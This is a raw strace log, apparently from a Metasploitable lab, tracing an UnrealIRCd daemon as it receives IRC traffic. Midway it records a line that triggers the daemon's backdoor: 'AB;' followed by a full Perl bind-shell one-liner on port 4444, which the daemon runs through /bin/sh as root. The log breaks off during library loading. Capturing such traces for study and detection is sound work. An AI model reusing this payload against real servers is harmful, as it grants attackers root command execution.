4519  07:09:19.263049 select(1024, [2 3 4 5 6 7 9], [], NULL, {0, 760000}) = 1 (in [9], left {0, 630000})
4519  07:09:19.389507 clock_gettime(CLOCK_MONOTONIC, {969, 206532290}) = 0
4519  07:09:19.389538 recv(9, "PRIVMSG  #testit3 BLABLALBLALBLALBLALBLALBLALBLALABLLALBLA\n", 8192, 0) = 59
4519  07:09:19.389579 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.389605 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.389625 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.389647 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.389669 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.389691 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.389712 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.389732 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.389750 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.389769 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.389788 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.389810 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.389830 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.389864 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.389912 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.389946 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.389967 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.389987 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.390008 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.390029 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.390050 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.390071 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.390093 time(NULL)        = 1495624159
4519  07:09:19.390112 time(NULL)        = 1495624159
4519  07:09:19.390131 gettimeofday({1495624159, 390137}, NULL) = 0
4519  07:09:19.390148 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:09:19.390193 clock_gettime(CLOCK_MONOTONIC, {969, 207208625}) = 0
4519  07:09:19.390209 gettimeofday({1495624159, 390215}, NULL) = 0
4519  07:09:19.390225 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [2], left {0, 940000})
4519  07:09:19.452446 clock_gettime(CLOCK_MONOTONIC, {969, 269466169}) = 0
4519  07:09:19.452480 accept(2, 0, NULL) = 8
4519  07:09:19.452502 getpeername(8, {sa_family=AF_INET, sin_port=htons(46517), sin_addr=inet_addr("10.0.2.4")}, [16]) = 0
4519  07:09:19.452536 fcntl64(8, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:09:19.452549 fcntl64(8, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:09:19.452563 setsockopt(8, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
4519  07:09:19.452589 setsockopt(8, SOL_SOCKET, SO_RCVBUF, [8192], 4) = 0
4519  07:09:19.452698 setsockopt(8, SOL_SOCKET, SO_SNDBUF, [8192], 4) = 0
4519  07:09:19.452711 getsockopt(8, SOL_IP, IP_OPTIONS, "", [0]) = 0
4519  07:09:19.452723 setsockopt(8, SOL_IP, IP_OPTIONS, NULL, 0) = 0
4519  07:09:19.452740 clock_gettime(CLOCK_MONOTONIC, {969, 269753725}) = 0
4519  07:09:19.452752 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 10
4519  07:09:19.452778 fcntl64(10, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:09:19.452788 fcntl64(10, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:09:19.452797 fcntl64(10, F_SETFD, FD_CLOEXEC) = 0
4519  07:09:19.452807 connect(10, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, 16) = 0
4519  07:09:19.452823 send(10, "\340H\1\0\0\1\0\0\0\0\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1", 39, MSG_NOSIGNAL) = 39
4519  07:09:19.452996 accept(2, 0, NULL) = -1 EAGAIN (Resource temporarily unavailable)
4519  07:09:19.453049 gettimeofday({1495624159, 453053}, NULL) = 0
4519  07:09:19.453075 select(1024, [2 3 4 5 6 7 9 10], [], NULL, {1, 0}) = 1 (in [10], left {1, 0})
4519  07:09:19.459039 clock_gettime(CLOCK_MONOTONIC, {969, 276071778}) = 0
4519  07:09:19.459072 recvfrom(10, "\340H\201\203\0\1\0\0\0\1\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1\300\22\0\6\0\1\0\0\0\315\0A\10prisoner\4iana\3org\0\nhostmaster\froot-servers\300AwsD\225\0\0\7\10\0\0\3\204\0\t:\200\0\t:\200", 513, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, [16]) = 116
4519  07:09:19.459114 close(10)         = 0
4519  07:09:19.459131 recvfrom(-1, 0xbfbaddf7, 513, 0, 0xbfbadff8, 0xbfbaddf0) = -1 EBADF (Bad file descriptor)
4519  07:09:19.459160 send(8, ":irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\r\n:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn\'t resolve your hostname; using your IP address instead\r\n", 174, 0) = 174
4519  07:09:19.459280 time(NULL)        = 1495624159
4519  07:09:19.459297 time(NULL)        = 1495624159
4519  07:09:19.459314 gettimeofday({1495624159, 459319}, NULL) = 0
4519  07:09:19.459330 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:09:19.459424 clock_gettime(CLOCK_MONOTONIC, {969, 276440099}) = 0
4519  07:09:19.459441 gettimeofday({1495624159, 459446}, NULL) = 0
4519  07:09:19.459456 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [9], left {0, 680000})
4519  07:09:19.779578 clock_gettime(CLOCK_MONOTONIC, {969, 596598975}) = 0
4519  07:09:19.779603 recv(9, "PRIVMSG  #testit3 ABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 45
4519  07:09:19.779629 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.779647 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.779662 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.779676 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.779690 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.779703 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.779717 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.779730 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.779743 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.779757 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.779770 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.779784 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.779797 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.779810 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.779824 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.779837 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.779850 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.779863 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.779877 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.779891 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.779904 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.779917 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:09:19.779968 gettimeofday({1495624159, 779972}, NULL) = 0
4519  07:09:19.779981 select(1024, [2 3 4 5 6 7 8 9], [], NULL, {1, 0}) = 1 (in [8], left {1, 0})
4519  07:09:19.780040 clock_gettime(CLOCK_MONOTONIC, {969, 597053093}) = 0
4519  07:09:19.780052 recv(8, "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n", 8192, 0) = 244
4519  07:09:19.780087 rt_sigaction(SIGINT, {SIG_IGN}, {0x8062280, [HUP INT], 0}, 8) = 0
4519  07:09:19.780107 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
4519  07:09:19.780119 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
4519  07:09:19.780134 clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfbae034) = 5496
5496  07:09:19.780204 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
5496  07:09:19.780218 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
5496  07:09:19.780228 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5496  07:09:19.780242 execve("/bin/sh", ["sh", "-c", "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n"], [/* 14 vars */]) = 0
5496  07:09:19.780348 brk(0)            = 0x80f9000
5496  07:09:19.780369 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5496  07:09:19.780387 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f7a000
5496  07:09:19.780404 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
5496  07:09:19.780433 open("/etc/ld.so.cache", O_RDONLY) = 1
5496  07:09:19.780470 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
5496  07:09:19.780517 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f72000
5496  07:09:19.780528 close(1)          = 0
5496  07:09:19.780539 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5496  07:09:19.780555 open("/lib/libncurses.so.5", O_RDONLY) = 1
5496  07:09:19.780569 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
5496  07:09:19.780676 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
5496  07:09:19.780693 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f42000
5496  07:09:19.780705 mmap2(0xb7f6f000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7f6f000
5496  07:09:19.780722 close(1)          = 0
5496  07:09:19.780734 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5496  07:09:19.780748 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
5496  07:09:19.780762 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
5496  07:09:19.780854 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
5496  07:09:19.780871 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f3e000
5496  07:09:19.780882 mmap2(0xb7f40000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f40000
5496  07:09:19.780897 close(1)          = 0
5496  07:09:19.780908 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5496  07:09:19.780933 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
5496  07:09:19.780969 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
5496  07:09:19.781085 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
5496  07:09:19.781102 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f3d000
5496  07:09:19.781116 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dee000
5496  07:09:19.781126 mmap2(0xb7f37000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f37000
5496  07:09:19.781141 mmap2(0xb7f3a000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f3a000
5496  07:09:19.781155 close(1)          = 0
5496  07:09:19.781177 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ded000
5496  07:09:19.781189 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7ded6b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
5496  07:09:19.781244 mprotect(0xb7f37000, 4096, PROT_READ) = 0
5496  07:09:19.781286 munmap(0xb7f72000, 29913) = 0
5496  07:09:19.781312 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
5496  07:09:19.781326 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
5496  07:09:19.781345 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf83e200) = -1 ENOTTY (Inappropriate ioctl for device)
5496  07:09:19.781374 brk(0)            = 0x80f9000
5496  07:09:19.781384 brk(0x80fa000)    = 0x80fa000
5496  07:09:19.781396 brk(0x80fb000)    = 0x80fb000
5496  07:09:19.781412 getuid32()        = 0
5496  07:09:19.781431 getgid32()        = 0
5496  07:09:19.781463 geteuid32()       = 0
5496  07:09:19.781487 getegid32()       = 0
5496  07:09:19.781502 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
5496  07:09:19.781520 time(NULL)        = 1495624159
5496  07:09:19.781534 brk(0x80fc000)    = 0x80fc000
5496  07:09:19.781550 brk(0x80fd000)    = 0x80fd000
5496  07:09:19.781583 open("/proc/meminfo", O_RDONLY) = 1
5496  07:09:19.781605 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
5496  07:09:19.781623 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f79000
5496  07:09:19.781634 read(1, "MemTotal:      1035240 kB\nMemFree:        648752 kB\nBuffers:         63280 kB\nCached:         168208 kB\nSwapCached:          0 kB\nActive:         251784 kB\nInactive:       108664 kB\nHighTotal:      131008 kB\nHighFree:          240 kB\nLowTotal:       904232 kB\nLowFree:        648512 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:            5900 kB\nWriteback:           0 kB\nAnonPages:      128980 kB\nMapped:          52008 kB\nSlab:            14812 kB\nSReclaimable:     6880 kB\nSUnreclaim:       7932 kB\nPageTables:       1956 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:   635396 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
5496  07:09:19.781717 close(1)          = 0
5496  07:09:19.781728 munmap(0xb7f79000, 4096) = 0
5496  07:09:19.781740 brk(0x80fe000)    = 0x80fe000
5496  07:09:19.781766 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
5496  07:09:19.781779 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
5496  07:09:19.781791 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
5496  07:09:19.781803 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
5496  07:09:19.781815 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
5496  07:09:19.781827 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
5496  07:09:19.781840 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
5496  07:09:19.781852 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
5496  07:09:19.781865 uname({sys="Linux", node="metasploitable", ...}) = 0
5496  07:09:19.781912 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5496  07:09:19.781959 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
5496  07:09:19.781992 brk(0x8100000)    = 0x8100000
5496  07:09:19.782003 getcwd("/etc/unreal", 4096) = 12
5496  07:09:19.782018 getpid()          = 5496
5496  07:09:19.782034 getppid()         = 4519
5496  07:09:19.782050 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
5496  07:09:19.782069 stat64("/sbin/sh", 0xbf83e1d8) = -1 ENOENT (No such file or directory)
5496  07:09:19.782082 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
5496  07:09:19.782099 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
5496  07:09:19.782122 socket(PF_FILE, SOCK_STREAM, 0) = 1
5496  07:09:19.782136 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
5496  07:09:19.782148 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
5496  07:09:19.782169 close(1)          = 0
5496  07:09:19.782181 socket(PF_FILE, SOCK_STREAM, 0) = 1
5496  07:09:19.782191 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
5496  07:09:19.782201 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
5496  07:09:19.782219 close(1)          = 0
5496  07:09:19.782232 open("/etc/nsswitch.conf", O_RDONLY) = 1
5496  07:09:19.782246 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
5496  07:09:19.782262 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f79000
5496  07:09:19.782273 read(1, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
5496  07:09:19.782325 read(1, "", 4096) = 0
5496  07:09:19.782334 close(1)          = 0
5496  07:09:19.782344 munmap(0xb7f79000, 4096) = 0
5496  07:09:19.782363 open("/etc/ld.so.cache", O_RDONLY) = 1
5496  07:09:19.782375 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
5496  07:09:19.782391 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f72000
5496  07:09:19.782501 close(1)          = 0
5496  07:09:19.782550 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5496  07:09:19.782566 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
5496  07:09:19.782598 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 